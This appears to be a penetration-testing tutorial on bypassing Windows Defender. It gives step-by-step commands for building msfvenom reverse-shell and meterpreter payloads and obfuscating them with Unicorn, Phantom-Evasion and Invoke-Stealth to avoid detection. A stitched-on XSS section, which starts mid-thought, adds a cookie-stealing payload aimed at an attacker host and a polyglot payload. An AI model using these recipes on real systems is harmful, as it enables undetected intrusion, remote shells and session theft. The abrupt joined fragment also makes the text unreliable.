
<img width="900" alt="Anti-Virus-Evasion-Tools" src="https://github.com/deryacortuk/Penetration-Testing-Tutorial/assets/53267226/160f278e-0c56-4857-986d-463d4b04f07f">

## Bypassing Windows Defender with hoaxshell and AMSI trigger

HoaxShell and AMSI bypass techniques are commonly employed by malicious individuals as part of their offensive security tactics. HoaxShell serves as a robust framework specifically designed to circumvent multiple security controls, notably including the Antimalware Scan Interface (AMSI) trigger. By utilizing HoaxShell, attackers aim to evade detection by antivirus software and other protective measures. On the other hand, AMSI, developed by Microsoft, acts as an interface for antivirus and other security solutions to scan and identify malicious
code present within active processes. It is an essential component that enables the detection of potentially harmful activities.


## Harnessing Metasploit templates and custom binaries for antivirus evasion

Metasploit is a powerful penetration testing framework which provides various templates and techniques for effective Antivirus (AV) evasion. These templates offer options like code obfuscation, polymorphism, and packing to create custom payloads that are less likely to be flagged by AV software. By leveraging the versatile capabilities of Metasploit, practitioners can significantly improve their chances of successfully evading AV defenses. This allows pen testers for more
comprehensive security assessments and testing.

## Baseline

Baseline payload To establish a baseline, we will generate the standard msfvenon reverse shell payload for a 32-bit Windows system using the command msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15 LPORT=4444 -f exe >
basepayload.exe.

Metasploit’s vast collection of exploits, payloads, and evasion techniques enables successful system compromise by evading AV detection. Utilizing advanced evasion techniques reduces detection rates,
enhancing the effectiveness of security assessments.

## Shellter

Shellter is an advanced and dynamic shellcode injection tool which is widely utilized in red teaming engagements and security assessments carried out by penetration testers and ethical hackers. Its main objective is to evade AV software and IDS. Shellter achieves this by employing dynamic encryption or encoding techniques for payloads.
Using the technique known as process hollowing, Shellter injects malicious shellcode into the memory space of legitimate processes. Moreover, researchers can leverage this tool to evaluate the effectiveness of security controls and identify
potential vulnerabilities in an organization’s defense mechanisms.
Shellter’s unique and powerful feature is dynamic binary instrumentation and injection, allowing seamless payload injection into Windows executables, evading antivirus and intrusion detection systems
effectively.

## Unicorn

The utilization of Magic Unicorn is a straightforward tool which involves
executing a PowerShell downgrade attack and directly injecting shellcode into the system’s memory. The usage process is uncomplicated: by launching Magic Unicorn (ensuring the presence of Metasploit in the correct path if opting for Metasploit methods), the tool automatically generates a PowerShell command. All that is required is to copy and paste this generated code into a command line
window or a payload delivery system for seamless execution.
1. Clone Unicorn by running the command git clone github.com/trustedsec/unicorn

2.Next, navigate to the new Unicorn directory using the command cd
unicorn. To view the available Unicorn options and comprehensive
descriptions of each attack, use the command ./unicorn.py --help
3.To create a payload with Unicorn, use the following command:
./unicorn.py windows/meterpreter/reverse_tcp <Listener IP>
<Listener Port>

Unicorn excels in generating undetectable payload executables through powerful encoding and obfuscation techniques, enabling seamless exploitation of target systems while evading antivirus and
security solutions.

## Phantom-Evasion

Phantom-Evasion is a python-based tool designed for antivirus evasion purposes. It has the capability to generate executable files that are highly difficult to detect, even when using the widely used x86 msfvenom payload.

1. Begin by downloading the tool using the command git clone https://github.com/oddcod3/Phantom-Evasion.git
2. Navigate to the Phantom-Evasion folder by executing the command cd /phantom-evasion. Grant executable permissions and set up the required dependencies by running the commands chmod +x ./phantom-evasion.py and ./phantom-evasion.py --setup
3.Generate the payload using the following command: python3 phantomevasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.29.15 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -
jr 0 -E 5 -f exe -o PhEv.exe
Phantom Evasion’s exceptional polymorphic engine and payload
generation capabilities empower penetration testers to create undetectable payloads, bypassing antivirus software and security controls for successful system infiltration.

## Invoke-Stealth

This tool helps you to automate the obfuscation process of any script written in PowerShell with different techniques. You can use any of them separately, together or all of them sequentially with ease, from Windows or Linux.

1. Begin by downloading Invoke-Stealth. Execute the command git clone
https://github.com/JoelGMSec/Invoke-Stealth.git to download the tool.


2. Navigate to the Invoke-Stealth folder using the command cd InvokeStealth. Run the command pwsh Invoke-Stealth.ps1 --help to explore the available obfuscation techniques and other utilities.
3.Use the following command: msfvenom -p windows/powershell_reverse_tcp
LHOST=192.168.29.15 LPORT=4444 -e x86/shikata_ga_nai -f psh -o
payloadummed.ps1.
4. Execute the following command pwsh Invoke-Stealth.ps1
/home/ummedmeel/Desktop/payloadummedm.ps1 -technique All.

Invoke-Stealth generates stealthy PowerShell scripts using
obfuscation and encryption to evade antivirus detection and execute covert operations.

# XSS payload
This means you can construct an XSS payload without quotes, like this:
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 
47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 
101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
The String.fromCharCode() function returns a string, given an input list 
of ASCII character codes. 

Take a look at this polyglot payload published by EdOverflow at https://polyglot.innerht.ml/:javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
